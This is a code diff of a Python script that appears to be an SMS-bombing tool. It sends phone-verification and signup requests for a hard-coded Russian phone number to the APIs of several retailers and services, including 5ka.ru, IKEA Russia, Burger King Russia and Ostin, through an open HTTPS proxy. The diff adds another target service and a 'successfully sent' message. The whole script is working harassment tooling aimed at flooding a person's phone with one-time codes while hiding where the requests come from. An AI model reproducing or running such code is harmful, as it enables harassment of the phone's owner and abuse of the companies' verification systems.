@@ -3,6 +3,8 @@ import time
 import random
 
 
+
+
 #print("Введи номер телефона без кода страны")
 #phone=input()
 
@@ -10,12 +12,11 @@ import random
 #print("Номер телефона " + phone)
 phone = '9991253348'
 ts = 1
-ipPort = "36.66.103.227:8080"
+ipPort = "149.19.224.39:3128"
 proxy = {"https": "https://" + ipPort}
 headers = {
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124",
     "Content-Type": "application/json", }
-
 
 def pyaterka():
     pPhone = "+7" + phone
@@ -25,8 +26,6 @@ def pyaterka():
     p = requests.post("https://5ka.ru/api/v1/services/phones/add", headers=pyaterkaHeaders, json={"number": pPhone},
                       proxies=proxy)
     print(p.status_code)
-    
-
 
 def karusel():
     karHeaders = headers
@@ -37,7 +36,6 @@ def karusel():
                         proxies=proxy)
     print(kar.status_code)
     print(kar.json())
-
 
 def aptekaru():
     aptHeaders = headers
@@ -61,13 +59,23 @@ def ikea():
     ikPhone="+7" + phone
     ik=requests.post("https://ru.accounts.ikea.com/cim/ru/ru/v1/passwordless/start",headers=ikHeaders,proxies=proxy,json={"phoneNumber":ikPhone,"flow":"SIGNUP_PHONE_VERIFY"})
     print(ik.status_code,"Ikea")
+
 def burgerKing():
     bkHeaders=headers
     bkHeaders.update({"Host":"burgerking.ru","Origin":"https://burgerking.ru","x-burgerking-session-id":"875c2b20-f7c3-11eb-9546-41b04798b4e4"})
     bkPhone="7" + phone
     bk=requests.post("https://burgerking.ru/middleware/bridge/api/v3/auth/signup",headers=bkHeaders,proxies=proxy,json={"phone":bkPhone,"invite":""} )
-    print(bk.status_code,"Burger King")
+    if bk.status_code==200:
+        print("Успешно отправлено "+"BurgerKing")
 
+def ostin():
+    osHeaders=headers
+    osHeaders.update({"x-ts-ajax-request":"true","x-security-request":"required","accept-encoding":"gzip, deflate, br","accept-language":"ru-RU,ru;q=0.9","accept":"application/json, text/plain, */*"})
+    osPhone="+7"+phone
+    os=requests.post("https://ostin.com/api/v2/front/request-code",headers=osHeaders,proxies=proxy,json={"phone":osPhone,"channel":"PUSH"})
+    print(os.status_code,"Ostin")
+
+ostin()
 burgerKing()
 ikea()
 pyaterka()
